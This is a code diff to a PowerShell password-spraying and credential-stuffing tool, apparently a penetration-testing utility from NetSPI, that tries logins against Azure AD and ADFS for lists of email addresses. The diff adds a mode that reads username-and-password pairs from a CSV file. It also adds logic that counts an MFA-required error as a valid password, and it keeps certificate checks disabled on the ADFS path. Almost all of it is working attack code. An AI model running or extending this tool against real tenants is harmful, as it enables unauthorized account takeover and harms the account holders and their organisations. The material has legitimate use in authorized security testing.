@@ -1,4 +1,4 @@
-#requires -Modules MSOnline
+#requires -Modules AzureAD
 
 <#
 	    .SYNOPSIS
@@ -17,20 +17,29 @@
 
 	    .EXAMPLE
 	       
-	       PS C:\> Invoke-ExternalDomainBruteforce -email test@test.com -password "Password123" -domain "test.com" | ft -AutoSize
+	       PS C:\> Invoke-ExternalDomainBruteforce -email test@test.com -password "Password123" -domain "test.com" -type "managed" | ft -AutoSize
 
 			Email          Domain    Password      
 			-----          ------    ----          
 			test@test.com  test.com  Password123 
-	       
+
 	    .EXAMPLE
 	       
-	       PS C:\> Invoke-ExternalDomainBruteforce -list "C:\Temp\emails.txt" -password "Password123" -domain "test.com"  | ft -AutoSize
+	       PS C:\> Invoke-ExternalDomainBruteforce -emails "C:\Temp\emails.txt" -password "Password123" -domain "test.com" | ft -AutoSize
 
 			Email           Domain    Password      
 			-----           ------    ----          
 			test@test.com   test.com  Password123 
 			test39@test.com test.com  Password123 
+	       
+	    .EXAMPLE
+	       
+	       PS C:\> Invoke-ExternalDomainBruteforce -list "C:\Temp\email-password.csv" -domain "test.com"  | ft -AutoSize
+
+			Email           Domain    Password      
+			-----           ------    ----          
+			test@test.com   test.com  Password123
+			test39@test.com test.com  WeakPassword987 
 
 	     .NOTES
 	     Author: Ryan Gandrud (@siegenapster), NetSPI - 2017
@@ -124,7 +133,11 @@ function Invoke-ExternalDomainBruteforce{
         HelpMessage="Email address to test password against.")]
         [string]$email,
 
-        [Parameter(Mandatory=$true,
+        [Parameter(Mandatory=$false,
+        HelpMessage="File location containing a list of email addresses to test a password against. E.g. C:\temp\emails.txt")]
+        [string]$emails,
+
+        [Parameter(Mandatory=$false,
         HelpMessage="Password to test against username(s).")]
         [string]$password,
 
@@ -133,12 +146,16 @@ function Invoke-ExternalDomainBruteforce{
         [string]$domain,
 		
 		[Parameter(Mandatory=$false,
-        HelpMessage="Location of list of usernames/emails to test. E.g. C:\temp\emails.txt")]
-        [string]$list
+        HelpMessage="File location of usernames and passwords, separated by a comma (test@test.com,Password). E.g. C:\temp\user-pass.csv")]
+        [string]$userPass
     )
 
-	if($list){
-		$Users = Get-Content $list
+	if($userPass){
+		$Users = Get-Content $userPass
+        $UP = $true
+    }
+	elseif($emails){
+		$Users = Get-Content $emails
     }
 	elseif($email) {
 		$Users = $email
@@ -165,20 +182,28 @@ function Invoke-ExternalDomainBruteforce{
 		}
 		$Users | ForEach-Object {
 		    	
+            # Checking for UserPass combo list
+            if ($UP){
+                $User,$password = $_.split(',',2)
+            }
+            else{
+                $User = $_
+            }
+
 			try{
 				# Make all errors terminating to get try/catch to work.
 				$ErrorActionPreference = "Stop";
 				
 				# Setting up credential object
-				$User = $_
 				$PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force
 				$Credential = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $User, $PWord
 				
 				Write-Verbose "Testing $($User) with password $($password)"
 				
 				# Attempt to authenticate to Managed domain
-				connect-msolservice -credential $Credential
-				
+				#connect-msolservice -credential $Credential
+                Connect-AzureAD -Credential $Credential				
+
 				# If no error is detected, authentication is successful
 				Write-Host "Authentication Successful: `t'$User' - "$password -ForegroundColor Green
 				$EmailTestResults.Rows.Add($User, $domain, $password) | Out-Null	
@@ -192,7 +217,12 @@ function Invoke-ExternalDomainBruteforce{
 				# if($user -match 'test'){Write-Host "Authentication Successful: `t'$User' - "$password -ForegroundColor Green;$EmailTestResults.Rows.Add($User, "N/A", $password) | Out-Null;$LastSuccessAuth = $User}
 				# else{Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red}
 				
-				Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red
+                if(($PSItem.ToString()) -like "*you must use multi-factor authentication*"){
+                    Write-Host "Authentication Successful: `t'$User' - "$password "(MFA endabled)" -ForegroundColor Green
+                } 
+                else{
+				    Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red
+                }
 			}
 		}
 		
@@ -204,7 +234,12 @@ function Invoke-ExternalDomainBruteforce{
 		
 		$Users | ForEach-Object {
 		
-            $user = $_
+            if ($UP){
+                $User,$password = $_.split(',',2)
+            }
+            else{
+                $User = $_
+            }
 
 			# Check if Invoke-ADFSSecurityTokenRequest is loaded
 			try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
@@ -221,16 +256,21 @@ function Invoke-ExternalDomainBruteforce{
             try{
                 $ErrorActionPreference = "Stop";
 		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
-                $EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
-                Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green
+                Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$User" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
+                $EmailTestResults.Rows.Add($User, $domain, $password) | Out-Null
+                Write-Host 'Authentication Successful: '$User' - '$password -ForegroundColor Green
             }
             catch{
 				# Blog writing mods
-				#if($user -match 'test'){Write-Host 'Authentication Successful: '$user' - '$password -ForegroundColor Green;$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null}
-                #else{Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red}
+				#if($user -match 'test'){Write-Host 'Authentication Successful: '$User' - '$password -ForegroundColor Green;$EmailTestResults.Rows.Add($User, $domain, $password) | Out-Null}
+                #else{Write-Host 'Authentication Failure: '$User' - '$password -ForegroundColor Red}
 				
-				Write-Host 'Authentication Failure: '$user' - '$password -ForegroundColor Red
+                if(($PSItem.ToString()) -like "*you must use multi-factor authentication*"){
+                    Write-Host "Authentication Successful: `t'$User' - "$password "(MFA endabled)" -ForegroundColor Green
+                } 
+                else{
+				    Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red
+                }
             }
 			
 		}
